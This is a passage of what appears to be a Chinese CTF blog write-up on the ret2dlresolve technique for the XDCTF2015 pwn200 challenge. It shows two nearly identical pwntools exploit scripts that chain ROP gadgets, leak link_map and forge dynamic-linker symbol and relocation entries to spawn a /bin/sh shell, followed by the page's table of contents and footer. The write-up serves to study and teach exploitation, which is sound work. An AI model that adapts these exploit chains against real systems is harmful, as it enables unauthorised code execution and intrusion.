+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。</span></span><br><span class="line"><span class="comment">#此程序中没有pop rdx的gadget</span></span><br><span class="line"><span class="comment">#ret2csu调用read</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">new_stack=bss_addr+<span class="number">0x200</span></span><br><span class="line">pop_rbp=<span class="number">0x00000000004005b8</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x00000000004007a1</span></span><br><span class="line">leave_ret=<span class="number">0x000000000040066c</span></span><br><span class="line">libc_csu_init_gadget_start1_addr=<span class="number">0x40079A</span></span><br><span class="line">libc_csu_init_gadget_start2_addr=<span class="number">0x400780</span></span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt0=<span class="number">0x400500</span></span><br><span class="line">rel_plt=elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#  Elf64_Sym &lt;offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0&gt; ; &quot;write&quot;</span></span><br><span class="line"><span class="comment">#LOAD:00000000004003D5 aWrite          db &#x27;write&#x27;,0            ; DATA XREF: LOAD:00000000004002D8↑o</span></span><br><span class="line">fake_st_name=new_stack+<span class="built_in">len</span>(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)-dynstr</span><br><span class="line">fake_st_info=<span class="number">0x12</span></span><br><span class="line">fake_st_other=<span class="number">0x0</span></span><br><span class="line">fake_st_shndx=<span class="number">0x0</span></span><br><span class="line">fake_st_value=<span class="number">0x0</span></span><br><span class="line">fake_st_size=<span class="number">0x0</span></span><br><span class="line">fake_write_sym=p32(fake_st_name)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)+p64(fake_st_value)+p64(fake_st_size)</span><br><span class="line">fake_write_sym_addr=new_stack+<span class="number">0x10</span></span><br><span class="line">align=<span class="number">0x18</span>-((fake_write_sym_addr-dynsym)&amp;<span class="number">0xf</span>)</span><br><span class="line">fake_write_sym_addr+=align</span><br><span class="line"></span><br><span class="line">fake_r_offset=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym_index=(fake_write_sym_addr-dynsym)/<span class="number">0x18</span></span><br><span class="line">fake_r_info=dynsym_index&lt;&lt;<span class="number">32</span>|<span class="number">7</span></span><br><span class="line">fake_r_addend=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">fake_write_rela=p64(fake_r_offset)+p64(fake_r_info)+p64(fake_r_addend)</span><br><span class="line">fake_write_rela_addr=new_stack+<span class="number">0x10</span>+<span class="built_in">len</span>(fake_write_sym)+align</span><br><span class="line">fake_reloc_arg=(fake_write_rela_addr-rel_plt)/<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload0=<span class="number">120</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload0+=p64(libc_csu_init_gadget_start1_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">1</span>)+p64(<span class="number">0x601008</span>)+p64(<span class="number">0x8</span>)</span><br><span class="line">payload0+=p64(libc_csu_init_gadget_start2_addr)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload0)</span><br><span class="line"></span><br><span class="line">link_map_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(link_map_addr)</span><br><span class="line">link_map_l_info_VERSYMIDX_DT_VERSYM_addr=link_map_addr+<span class="number">0x1c8</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)</span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM=<span class="number">120</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start1_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">0</span>)+p64(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start2_addr)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(fake_map_l_info_VERSYMIDX_DT_VERSYM)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#######################################################</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)     <span class="comment">#向new_stack中写入/bin/sh\x00</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(fake_write_sym_addr)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)+p64(main_addr) <span class="comment">#new_stack+0x10中写入fake_write_Elf64_Sym</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00system\x00&quot;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">p.send(fake_write_sym)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(fake_write_rela_addr)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)+p64(main_addr) <span class="comment">#0x10中写入fake_write_Elf64_rela</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.send(fake_write_rela)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload3=&#x27;a&#x27;*120+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(new_stack)+p64(0xdeadbeef)+p64(plt0)+p64(fake_reloc_arg)</span></span><br><span class="line">payload3=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(new_stack)+p64(plt0)+p64(fake_reloc_arg)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\wqf\AppData\Roaming\Typora\typora-user-images\image-20220702224806957.png" alt="image-20220702224806957"></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。</span></span><br><span class="line"><span class="comment">#此程序中没有pop rdx的gadget</span></span><br><span class="line"><span class="comment">#ret2csu调用read</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">new_stack=bss_addr+<span class="number">0x200</span></span><br><span class="line">pop_rbp=<span class="number">0x00000000004005b8</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x00000000004007a1</span></span><br><span class="line">leave_ret=<span class="number">0x000000000040066c</span></span><br><span class="line">libc_csu_init_gadget_start1_addr=<span class="number">0x40079A</span></span><br><span class="line">libc_csu_init_gadget_start2_addr=<span class="number">0x400780</span></span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt0=<span class="number">0x400500</span></span><br><span class="line">rel_plt=elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#  Elf64_Sym &lt;offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0&gt; ; &quot;write&quot;</span></span><br><span class="line"><span class="comment">#LOAD:00000000004003D5 aWrite          db &#x27;write&#x27;,0            ; DATA XREF: LOAD:00000000004002D8↑o</span></span><br><span class="line">fake_st_name=new_stack+<span class="built_in">len</span>(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)-dynstr</span><br><span class="line">fake_st_info=<span class="number">0x12</span></span><br><span class="line">fake_st_other=<span class="number">0x0</span></span><br><span class="line">fake_st_shndx=<span class="number">0x0</span></span><br><span class="line">fake_st_value=<span class="number">0x0</span></span><br><span class="line">fake_st_size=<span class="number">0x0</span></span><br><span class="line">fake_write_sym=p32(fake_st_name)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)+p64(fake_st_value)+p64(fake_st_size)</span><br><span class="line">fake_write_sym_addr=new_stack+<span class="number">0x10</span></span><br><span class="line">align=<span class="number">0x18</span>-((fake_write_sym_addr-dynsym)&amp;<span class="number">0xf</span>)</span><br><span class="line">fake_write_sym_addr+=align</span><br><span class="line"></span><br><span class="line">fake_r_offset=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym_index=(fake_write_sym_addr-dynsym)/<span class="number">0x18</span></span><br><span class="line">fake_r_info=dynsym_index&lt;&lt;<span class="number">32</span>|<span class="number">7</span></span><br><span class="line">fake_r_addend=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">fake_write_rela=p64(fake_r_offset)+p64(fake_r_info)+p64(fake_r_addend)</span><br><span class="line">fake_write_rela_addr=new_stack+<span class="number">0x10</span>+<span class="built_in">len</span>(fake_write_sym)+align</span><br><span class="line">fake_reloc_arg=(fake_write_rela_addr-rel_plt)/<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload0=<span class="number">120</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload0+=p64(libc_csu_init_gadget_start1_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">1</span>)+p64(<span class="number">0x601008</span>)+p64(<span class="number">0x8</span>)</span><br><span class="line">payload0+=p64(libc_csu_init_gadget_start2_addr)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload0)</span><br><span class="line"></span><br><span class="line">link_map_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(link_map_addr)</span><br><span class="line">link_map_l_info_VERSYMIDX_DT_VERSYM_addr=link_map_addr+<span class="number">0x1c8</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)</span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM=<span class="number">120</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start1_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">0</span>)+p64(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start2_addr)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">7</span>+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(fake_map_l_info_VERSYMIDX_DT_VERSYM)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#######################################################</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)     <span class="comment">#向new_stack中写入/bin/sh\x00</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(fake_write_sym_addr)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)+p64(main_addr) <span class="comment">#new_stack+0x10中写入fake_write_Elf64_Sym</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00system\x00&quot;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">p.send(fake_write_sym)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(fake_write_rela_addr)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)+p64(main_addr) <span class="comment">#0x10中写入fake_write_Elf64_rela</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.send(fake_write_rela)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload3=&#x27;a&#x27;*120+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(new_stack)+p64(0xdeadbeef)+p64(plt0)+p64(fake_reloc_arg)</span></span><br><span class="line">payload3=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(new_stack)+p64(plt0)+p64(fake_reloc_arg)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2022/07/03/0ctf_2018_babystack/" title="">
+                    <div class="nextTitle">[Untitled Post]</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/05/07/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="非栈上的格式化字符串漏洞">
+                    <div class="prevTitle">非栈上的格式化字符串漏洞</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:2811745785@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/wysyrg" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ELF%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.</span> <span class="toc-text">ELF结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DYNAMIC"><span class="toc-number">1.1.</span> <span class="toc-text">_DYNAMIC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dynstr%E2%80%94%E2%80%94DT-STRTAB"><span class="toc-number">1.2.</span> <span class="toc-text">.dynstr——DT_STRTAB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dynsym%E2%80%94%E2%80%94DT-SYMTAB"><span class="toc-number">1.3.</span> <span class="toc-text">.dynsym——DT_SYMTAB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rel-plt%E2%80%94%E2%80%94DT-JMPREL"><span class="toc-number">1.4.</span> <span class="toc-text">.rel.plt——DT_JMPREL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dl-runtime-resolve-xsave"><span class="toc-number">1.5.</span> <span class="toc-text">_dl_runtime_resolve_xsave</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dl-fixup"><span class="toc-number">1.6.</span> <span class="toc-text">_dl_fixup</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">2.</span> <span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A2015-xdctfpwn200"><span class="toc-number">3.</span> <span class="toc-text">例题：2015-xdctfpwn200</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#No-RELRO"><span class="toc-number">3.1.</span> <span class="toc-text">No RELRO</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="toc-number">3.1.1.</span> <span class="toc-text">保护检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90"><span class="toc-number">3.1.2.</span> <span class="toc-text">IDA分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-number">3.1.4.</span> <span class="toc-text">exp：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Partial-RELRO"><span class="toc-number">3.2.</span> <span class="toc-text">Partial RELRO</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">保护检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">IDA分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#step1"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">step1</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#step2"><span class="toc-number">3.2.3.2.</span> <span class="toc-text">step2</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#step3"><span class="toc-number">3.2.3.3.</span> <span class="toc-text">step3</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#step4"><span class="toc-number">3.2.3.4.</span> <span class="toc-text">step4</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#step5"><span class="toc-number">3.2.3.5.</span> <span class="toc-text">step5</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp"><span class="toc-number">3.2.4.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
